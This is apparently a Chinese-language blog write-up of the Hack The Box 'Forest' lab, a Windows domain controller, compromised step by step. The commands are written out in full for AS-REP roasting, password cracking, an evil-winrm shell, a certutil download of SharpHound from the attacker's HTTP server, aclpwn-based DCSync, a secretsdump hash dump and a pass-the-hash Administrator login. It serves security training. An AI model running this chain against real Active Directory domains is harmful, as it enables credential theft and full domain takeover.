@[TOC](目录)
## HTB-Forest

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200324231703257.png)

## [1]侦擦与枚举
### [1.1]开放的端口
- 使用**nmap**扫描开放的端口以及有用的信息

```bash
root@kali:~/HTB/Forest$ nmap -sC -sV -oA nmap/Forest 10.10.10.161
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200324232023919.jpg)
我们可以发现：

	- 使用Kerberos打开了88端口
	- 通常在Windows Server Domain Controller中打开的所有端口，我们看到它是Windows Server 2016 Standard,在445端口上
	- WinRM2.0(Microsoft Windows 远程管理)在5985端口上
	- 靶机的域名是htb.local
	
### [1.2]Active Directory

 1. Acitve Directory(AD) 是一项Microsoft技术，用于管理网络上的计算机和其他设备。
 2. Active Directory 允许网络管理员在网络中创建和管理域、用户和对象。
 3. 例如管理员可以创建一组用户，并赋予他们对服务器上某些目录的特定访问权限。随着网络的发展，Active Directory提供了一种将大量组织为逻辑组和子组的方法，同时提供了每个级别的访问控制。

### [1.3]枚举用户数据

- 使用工具**enum4linux**对靶机进行简单的枚举
```bash
root@kali:~/HTB/Forest# enum4linux -a 10.10.10.161 > user.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200324233800573.jpg#pic_center)
我们从输出中获得了一堆潜在的用户并且保存在**user.txt**文件中，但是因为输出的文件很多并且很杂乱我们必须对文件进行过滤，提取有用的信息。

- 过滤**enum4linux**的输出结果得到完整的用户清单
```bash 
root@kali:~/HTB/Forest$ cat user.txt | awk -F ":"  '{print $5}' | awk -F " "  '{print $1}' > userlist.txt
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200324234536627.png)
由于长度的原因上图的清单并不完整，如果到达这一步，在清单的最后一个用户为**svc-alfresco**。

## [2]获得访问权限
通过简单的枚举和过滤我们拥有一份有效的用户列表，我们可以尝试**ASREPRoast**攻击。

[ASREPRoast](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)           攻击会寻找不需要**Kerberos**预身份验证的用户。这意味着任何人都可以代表那些用户中的任何一个向**KDC**发送**AS_REQ**请求，并且接收**AS_REP**消息。这最后一种消息包含大量数据使用原始用户密钥(有其密码派生)进行加密，然后使用此消息，可以离线破解用户名密码。

### [2.1]安装impacket、GetNPUsers.py脚本
- [imapcket](https://github.com/SecureAuthCorp/impacket.git)
- 下载方式
```bash
root@kali:~/HTB/Forest$ git clone https://github.com/SecureAuthCorp/impacket.git impacket-tools
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200325000517900.png#pic_center)
### [2.2]使用GetNPUsers.py脚本

```bash
root@kali:~/HTB/Forest$ python imapchet-tools/examples/GetNPUsers.py htb.local/ -usersfile userlist.txt -format john -outputfile hashed -dc-ip 10.10.10.161
```

	  htb.local 这是我们从nmap输出提取的域名
	 -usersfile 这是我们要测试userfile.txt的用户列表，我们充enum4linux输出中提取的有效用户列表
	 -format john 设置为john格式，因此我们可以轻松破解
	 -outputfile hashed 将哈希保存在hashed文件中
	 -dc-ip 靶机的IP地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200325004342754.png)
 从输出上来看这些似乎没什么用，hashed是加密的哈希格式，并且有一个用户的ID：**svc-alfresco**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200325004612629.png)
- 使用john对hashed文件进行破解
```bash
root@kali:~/HTB/Forest$ john --wordlist=/usr/share/worlists/rockyou.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200325003357509.png#pic_center)
破解之后我们发现密码为**s3rvice**。

### [2.3]获得访问权限
(WinRM）是一种Microsoft协议，允许使用SOAP通过HTTP（S）远程管理Windows计算机。在后端，它利用WMI，因此您可以将其视为WMI的基于HTTP的API。
由于Windows远程管理（WinRM）再5985上已经启用，让我们使用evil-winrm工具尝试攻击。
- evil-winrm安装以及使用
```bash
root@kali:~/HTB/Forest$ gem install evil-winrm 
root@kali:~/HTB/Forest$ evil-winrm -i 10.10.10.161 -u svc-aflresco -p s3rvice
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200325005522719.png#pic_center)
我们成功登录了svc-alfresco用户。
## [3]本地侦擦和枚举
### [3.1]基本信息
- 当我们成功的登录到目标机上，我们可以使用whoami命令来指定用户所属的组
```bash
PS C:\> whoami /groups
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200326003000751.png)
我们发现服务账号还具有该**Account Operator**角色，这意味着它可以创建用户并将其添加到组中。
接下来我们可以使用**BloodHound**这个非常有用的工具，它可以在**Active Directory**环境中自动查找有趣的路径以提升特权。首先我们要做的是从**Active Directory**收集必要的数据。可以实现**Blood Hound ingester** 称为**Sharp Hound**(使用二进制或者Powershell的脚本)，并与从再域中的任何计算机域的任何用户。

由于我们位于**Active Directory**的域中，因此我们使用**Blood Hound**揭示该域中隐藏的文件。
### [3.2]BloodHound工具

- 安装BloodHound
```bash
root@kali:~/HTB/Forest$ apt install bloodhound
```
- 拥有SharpHound调查员
Sharphound必须从域用户中运行，可以直接通过登录或通过其他方法（例如RUNAS）运行。
然后，我们可以使用命令行枚举主机上组中的用户
```bash
PS C:\> net grous "Exchange Windos Permissions"
```
该命令使您知道用户从主机**svc-alfresco**请求了资源。此信息确认当前在组上没有活动会话。*Exchange Windows Permissions SOURCE 
svc-alfresco Exchange Windows Permissions*
这些不同的信息（并非详尽无遗）是由SharpHound采集器收集的，并以json格式保存在不同的文件中。
 - 将SharpHound安装到svs-alfresco
 1. 下载SharpHound.exe
```bash
root@kali:~/HTB/Forest$ git clone https://github.com/BloodHoundAD/BloodHound.git
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200326020803866.png)

2. 使用python设置HTTP服务器
```bash
root@kali:~/HTB/Forest/BloodHound/Ingestors# python -m SimpleHTTPServer 80
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200326021840292.png)
注：必须在刚下载好的*BloodHound/Ingestors*开启python服务器

3.  在evil-winrm Shell中安装并运行SharpHound.exe
```bash
PS C:\ certutil.exe -urlcache -split -f http://10.10.14.45/SharpHound.exe SharpHound.exe
PS C:\ ./SharpHound.exe
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200326022638467.png)
运行之后的SharpHound.exe将会产生一个ZIP文档，我们将这个文档从
svc-aflresco主机上下载到我们的系统上。
- 下载ZIP
```bash
PC C:\ download 20200325112604_BloodHound.zip
```
回到我们的系统上。
- 启用neo4j服务、bloodhound
```bash
root@kali:~/HTB/Forest$ neo4j console bloodhound
root@kali:~/HTB/Forest$ bloodhound 
```
*注：当启动bloodhound的时候需要有neo4j数据库的支持，如果从未使用过neo4j数据库需要到[这里](http://localhost:7474/)设置账号和密码*

将得到的ZIP存档拖到BloodHound软件中将得到一份“找到域管理员的最短路径”
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200326024608228.png)
我们发现：
- **svc-alfresco**用户在*SERVICE ACCOUNT组* 中
- 该组是*PRIVILEGEDIT ACCOUNT组* 的成员，*PRIVILEGED IT ACCOUNT组* 是*ACCOUNT OPERATORS组* 的成员。
- 并且*ACCOUNT OPERATORS组* 对*EXCHANGE WINDOWS PERMISSIONS组* 拥有**GenericALL权限**（允许我们对此组执行任何操作 GenericAll = 完全控制）
- **svc-alfresco** 对*EXCHANGE WINDOWS PERMISSIONS*具有**GenericALL权限**
- 交换*WINDOWS权限* 对域具有WriteDACL权限（提供修改对象安全性的能力，这可能导致对对象的完全控制）。
## [4]特权提升
### [4.1]攻击思路
1. 直接从**svc-alfresco**转到管理员（这样子将会破会HTB上其他的用户盒子），因此我将要使用**aclpwn**工具来实现自动化
2. 将**svc-alfresco**用户添加到*EXCHANGE WINDOWS PERMISSIONS组* 里(在我们使用whoami  /goups发现可以创建用户并将其添加到组中)
3. 授予**svc-alfresco**用户对域的**FCSync权限**

### [4.2]获取根
- 安装aclpwn工具、使用
```bash
root@kali:~/HTB/Forest$ pip install aclpwn
root@kali:~/HTB/Forest$ aclpwn -f svc-alfresco -ft user -d htb.local -du neo4j -dp 311311 -sp s3rvice -s 10.10.10.161
```
*注：路径选择 0*

- 获得组里每个人（包括管理员）的哈希
这里将使用[imapcket](https://github.com/SecureAuthCorp/impacket.git)中的secretsdump.py脚本
```bash
root@kali:~/HTB/Forest$ python impacket-tools/examples/secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200326033210707.png)

- 使用evil-winrm登录Administrator
```bash
root@kali:~/HTB/Forest$ evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200326033543607.png)
可以看到我们成功的获得了root！
I got Root~!![在这里插入图片描述](https://img-blog.csdnimg.cn/20200327004206477.jpg)


